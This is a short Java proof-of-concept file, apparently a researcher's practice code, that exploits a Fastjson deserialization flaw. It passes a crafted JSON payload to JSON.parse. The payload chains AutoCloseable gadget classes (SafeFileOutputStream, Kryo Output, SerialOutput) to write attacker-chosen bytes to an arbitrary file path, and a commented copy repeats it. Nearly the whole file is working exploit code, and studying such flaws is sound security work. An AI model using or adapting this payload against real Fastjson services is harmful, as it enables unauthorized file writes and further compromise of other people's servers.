import com.alibaba.fastjson.JSON;

public class Exp {
    public static void main(String[] args) {
        // poc 看起来挺复杂的，还需要好好研究
        String poc = "{\n" +
                "    \"stream\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +
                "        \"targetPath\": \"D:\\Coding\\C\\JavaHacker\\hacked.txt\",\n" +
                "        \"tempPath\": \"D:\\Coding\\C\\JavaHacker\\test.txt\"\n" +
                "    },\n" +
                "    \"writer\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"com.esotericsoftware.kryo.io.Output\",\n" +
                "        \"buffer\": \"cHduZWQ=\",\n" +
                "        \"outputStream\": {\n" +
                "            \"$ref\": \"$.stream\"\n" +
                "        },\n" +
                "        \"position\": 5\n" +
                "    },\n" +
                "    \"close\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"com.sleepycat.bind.serial.SerialOutput\",\n" +
                "        \"out\": {\n" +
                "            \"$ref\": \"$.writer\"\n" +
                "        }\n" +
                "    }\n" +
                "}";
        JSON.parse(poc);
    }
}

// {
//     "stream": {
//         "@type": "java.lang.AutoCloseable",
//         "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
//         "targetPath": "E:/code/hacked.txt",
//         "tempPath": "E:/code/test.txt"
//     },
//     "writer": {
//         "@type": "java.lang.AutoCloseable",
//         "@type": "com.esotericsoftware.kryo.io.Output",
//         "buffer": "cHduZWQ=",
//         "outputStream": {
//             "$ref": "$.stream"
//         },
//         "position": 5
//     },
//     "close": {
//         "@type": "java.lang.AutoCloseable",
//         "@type": "com.sleepycat.bind.serial.SerialOutput",
//         "out": {
//             "$ref": "$.writer"
//         }
//     }
// }